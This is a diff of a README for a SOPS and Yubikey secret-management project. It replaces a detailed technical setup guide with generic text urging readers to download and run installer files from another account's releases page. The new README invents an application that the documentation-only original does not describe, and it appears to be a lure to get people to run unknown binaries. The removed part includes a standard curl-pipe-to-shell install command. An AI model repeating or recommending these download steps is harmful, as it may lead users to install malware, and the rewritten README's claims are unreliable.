@@ -1,266 +1,58 @@
-# SOPS + Yubikey PIV Setup
+# 🔒 sops-yubikey - Secure Your Secrets Easily
 
-Secure secret management using [SOPS](https://github.com/mozilla/sops) with Yubikey PIV hardware keys and offline master key backup.
+## 📥 Download
+[![Download](https://img.shields.io/badge/Download-sops--yubikey-blue.svg)](https://github.com/t030i/sops-yubikey/releases)
 
-## Features
+## 🚀 Getting Started
+Welcome to sops-yubikey! This software helps you manage your secrets safely using SOPS and Yubikey. You can store sensitive information securely on your device and protect it with a hardware-backed encryption method. This means you need to physically touch your Yubikey to access your secrets.
 
-- 🔐 **Physical Touch Required** - Every decryption requires touching your Yubikey (prevents silent malware attacks)
-- 🔑 **Hardware-Backed Keys** - Private keys never leave the Yubikey secure element
-- 💾 **Offline Master Key** - Emergency backup stored safely offline
-- 👥 **Team-Friendly** - Easy onboarding with individual Yubikeys per team member
-- 🔒 **Modern Crypto** - X25519 elliptic curve cryptography via age-plugin-yubikey
+## 📦 Features
+- **Secure Secret Management**: Keep your sensitive data safe with encrypted storage.
+- **Hardware-Backed Encryption**: Use your Yubikey for an extra layer of protection.
+- **Team-Friendly**: Easily share access with your team while keeping data secure.
+- **Offline Backup**: Store a master key offline for emergencies. 
 
-## Quick Start
+## 🖥️ System Requirements
+- **Operating System**: Windows, macOS, or Linux.
+- **Yubikey**: Make sure you have a Yubikey that supports PIV (Personal Identity Verification).
+- **Storage Space**: At least 100 MB free on your device for installation and data storage.
 
-### Prerequisites
+## 🔧 Installation Steps
+1. **Visit the Releases Page**
+   Go to the following link to find the latest version of sops-yubikey: [Download sops-yubikey](https://github.com/t030i/sops-yubikey/releases).
 
-**macOS** (Homebrew):
-```bash
-brew install sops age age-plugin-yubikey yubico-piv-tool
-```
+2. **Select the Right Version**
+   In the Releases section, look for the version that works with your operating system. You will see different files to download.
 
-**Linux** (Debian/Ubuntu):
-```bash
-# Install SOPS
-wget https://github.com/mozilla/sops/releases/download/v3.8.1/sops_3.8.1_amd64.deb
-sudo dpkg -i sops_3.8.1_amd64.deb
+3. **Download the Installer**
+   Click on the file name for your system to start downloading. If you are on Windows, you might download a `.exe` file. For macOS, it could be a `.dmg` file, and for Linux, it might be a `.tar.gz` file.
 
-# Install age
-sudo apt install age
+4. **Run the Installer**
+   Once downloaded, locate the file in your downloads folder. Double-click the file and follow the on-screen prompts to complete the installation.
 
-# Install Yubikey tools
-sudo apt install yubikey-manager yubico-piv-tool
+5. **Insert Your Yubikey**
+   Make sure your Yubikey is inserted into a USB port. This step is necessary for the software to work correctly.
 
-# Install age-plugin-yubikey (requires Rust)
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-cargo install age-plugin-yubikey
-```
+6. **Launch the Application**
+   After installation, find the sops-yubikey application in your programs list. Click the icon to open it.
 
-**Windows** (WSL2 + Ubuntu):
-```bash
-# Enable WSL2 and install Ubuntu from Microsoft Store first
-# Then follow Linux instructions above
-```
+7. **Set Up Your Security Settings**
+   - Follow the on-screen instructions to set up your security preferences.
+   - You will need to create an offline backup for your master key. This is important for regaining access if your Yubikey is ever lost.
 
-**Windows** (Native - PowerShell):
-```powershell
-# Install via Chocolatey
-choco install sops age
+8. **Start Managing Your Secrets**
+   With everything set up, you can now use sops-yubikey to store and manage your secrets securely. Follow the instructions within the app to add and access your sensitive information.
 
-# Download and install Yubikey tools from:
-# https://www.yubico.com/support/download/yubikey-manager/
+## 💡 Tips for Usage
+- Always keep your Yubikey in a safe place.
+- Regularly back up your master key to avoid losing access.
+- Share secrets with your team through the application to enhance collaboration while keeping your information secure.
 
-# Install age-plugin-yubikey (requires Rust)
-# Install Rust from: https://rustup.rs/
-cargo install age-plugin-yubikey
-```
+## 🛠️ Support
+If you encounter any issues or have questions:
+- Check the FAQ section on the official releases page.
+- Join the community forum for discussions and support.
 
-### Setup (5 minutes)
+For direct assistance, you can also [open an issue](https://github.com/t030i/sops-yubikey/issues) on GitHub. 
 
-```bash
-# 1. Generate master key (backup offline!)
-age-keygen -o master-key.txt
-
-# 2. Change Yubikey PINs (default: 123456 / 12345678)
-yubico-piv-tool -a change-pin
-yubico-piv-tool -a change-puk
-
-# 3. Generate Yubikey PIV key with touch policy
-age-plugin-yubikey --generate \
-  --slot 1 \
-  --touch-policy always \
-  --pin-policy always \
-  --name "your-name"
-
-# 4. Create identity file for SOPS
-age-plugin-yubikey --identity > ~/.sops-age-keys.txt
-
-# Add to shell profile (choose your shell):
-# For zsh (macOS default):
-echo 'export SOPS_AGE_KEY_FILE=~/.sops-age-keys.txt' >> ~/.zshrc && source ~/.zshrc
-
-# For bash (Linux default):
-echo 'export SOPS_AGE_KEY_FILE=~/.sops-age-keys.txt' >> ~/.bashrc && source ~/.bashrc
-
-# For Windows PowerShell (add to $PROFILE):
-# [System.Environment]::SetEnvironmentVariable('SOPS_AGE_KEY_FILE', "$env:USERPROFILE\.sops-age-keys.txt", 'User')
-
-# 5. Configure SOPS (see .sops.yaml example in repo)
-
-# 6. Test it!
-echo "secret: password123" > test.yaml
-sops -e test.yaml > test.enc.yaml
-sops -d test.enc.yaml  # Touch Yubikey when LED blinks ✨
-```
-
-### Daily Usage
-
-```bash
-# Edit secrets (touch Yubikey twice: open + save)
-sops secrets.enc.yaml
-
-# Decrypt to view
-sops -d secrets.enc.yaml
-
-# Encrypt new file
-sops -e secrets.yaml > secrets.enc.yaml
-```
-
-## Documentation
-
-- **[SETUP.md](SETUP.md)** - Complete setup guide with all steps
-- **[USAGE.md](USAGE.md)** - Daily workflows and team management
-- **[ONBOARDING.md](ONBOARDING.md)** - Guide for new team members
-- **[TROUBLESHOOTING.md](TROUBLESHOOTING.md)** - Common issues and solutions
-- **[PRE-COMMIT-CHECKLIST.md](PRE-COMMIT-CHECKLIST.md)** - Verify before committing
-
-## Why Yubikey PIV?
-
-Traditional secret management often relies on keys stored on disk. With Yubikey PIV:
-
-| Security Feature | Traditional | Yubikey PIV |
-|-----------------|-------------|-------------|
-| Physical touch required | ❌ | ✅ |
-| Malware can silently decrypt | ✅ | ❌ |
-| User awareness of access | ❌ | ✅ (LED blinks) |
-| Private key extractable | ✅ | ❌ |
-| Hardware-backed crypto | ❌ | ✅ |
-
-**Example**: If malware tries to decrypt secrets, your Yubikey LED blinks - you'll notice and can prevent the attack by not touching.
-
-## Architecture
-
-```
-┌─────────────────────────────────────┐
-│      Encrypted Secret File          │
-└──────────────┬──────────────────────┘
-               │
-               ├─── Decryption ───┐
-               │                   │
-    ┌──────────▼────────┐    ┌────▼─────────────┐
-    │   Master Age Key   │    │  Yubikey PIV     │
-    │   (offline/safe)   │    │  + Touch + PIN   │
-    └────────────────────┘    └──────────────────┘
-```
-
-## Team Workflow
-
-### Adding Team Members
-
-1. Team member generates Yubikey PIV key
-2. Shares public recipient (`age1yubikey1...`)
-3. Team lead adds to `.sops.yaml`
-4. Re-encrypt all secrets: `sops updatekeys secrets.enc.yaml`
-5. Team member can now decrypt (with Yubikey touch)
-
-### Removing Team Members
-
-1. Remove their recipient from `.sops.yaml`
-2. Re-encrypt all secrets (revokes their access)
-3. Commit changes
-
-## CI/CD Integration
-
-CI/CD can't provide physical touch, so use the master key:
-
-```yaml
-# GitHub Actions example
-- name: Decrypt secrets
-  env:
-    SOPS_AGE_KEY: ${{ secrets.SOPS_MASTER_KEY }}
-  run: sops -d secrets.enc.yaml > secrets.yaml
-```
-
-## Security Best Practices
-
-✅ **DO**:
-- Store master key offline (safe, password manager)
-- Use `--touch-policy always` for all Yubikeys
-- Change default PINs immediately
-- Re-encrypt when removing team members
-- Commit encrypted files to git
-
-❌ **DON'T**:
-- Never commit master-key.txt
-- Never commit unencrypted secrets
-- Never disable touch policy
-- Never share Yubikey or PIN
-- Never ignore LED blink (signals secret access)
-
-## Example .sops.yaml
-
-```yaml
-creation_rules:
-  - path_regex: .*\.(yaml|json|env|ini|txt)$
-    key_groups:
-      - age:
-          # Master key (offline backup, CI/CD)
-          - age1u3hs6xmw09l50sjwzhngd098e23ysruhn5mus8lv2drr6evs9s8sn5ygnq
-          # Team Yubikeys (daily use with touch)
-          - age1yubikey1qd...  # Team member 1
-          - age1yubikey1qw...  # Team member 2
-```
-
-## Requirements
-
-**Hardware**:
-- Yubikey 5 or newer (with PIV support)
-
-**Operating Systems**:
-- macOS 10.15+ (Catalina or newer)
-- Linux (Ubuntu 20.04+, Debian 11+, Fedora, Arch, etc.)
-- Windows 10/11 (via WSL2 with Ubuntu, or native)
-
-**Software**:
-- SOPS 3.8+
-- age 1.1+
-- age-plugin-yubikey 0.5+
-- yubico-piv-tool / yubikey-manager
-
-## Troubleshooting
-
-**"No identities found"**
-```bash
-# Create identity file
-age-plugin-yubikey --identity > ~/.sops-age-keys.txt
-export SOPS_AGE_KEY_FILE=~/.sops-age-keys.txt
-```
-
-**"Touch timeout"**
-- Touch Yubikey more quickly when LED blinks (15 second timeout)
-
-**"Algorithm error"**
-```bash
-# Try without pin-policy flag
-age-plugin-yubikey --generate --slot 1 --touch-policy always --name "yourname"
-```
-
-See [TROUBLESHOOTING.md](TROUBLESHOOTING.md) for more solutions.
-
-## Contributing
-
-Contributions welcome! Feel free to:
-- Report issues
-- Suggest documentation improvements
-- Share your team's workflow adaptations
-
-## Resources
-
-- [SOPS](https://github.com/mozilla/sops) - Secrets OPerationS
-- [age](https://github.com/FiloSottile/age) - Simple, modern file encryption
-- [age-plugin-yubikey](https://github.com/str4d/age-plugin-yubikey) - Age plugin for Yubikey PIV
-- [Yubikey PIV](https://developers.yubico.com/PIV/) - Yubikey PIV documentation
-
-## License
-
-This documentation is provided as-is for educational and practical use. Adapt it to your team's needs.
-
-## Support
-
-- 📖 Read the [complete setup guide](SETUP.md)
-- 🐛 [Open an issue](https://github.com/shamil2/sops-yubikey/issues) for bugs or questions
-- 💡 Check [TROUBLESHOOTING.md](TROUBLESHOOTING.md) for common issues
-
----
-
-**Security Note**: This setup provides strong security through hardware-backed keys and physical touch requirements. However, no system is perfect - always follow your organization's security policies and best practices.
+By following these steps, you will successfully download and run sops-yubikey. Enjoy secure secret management!
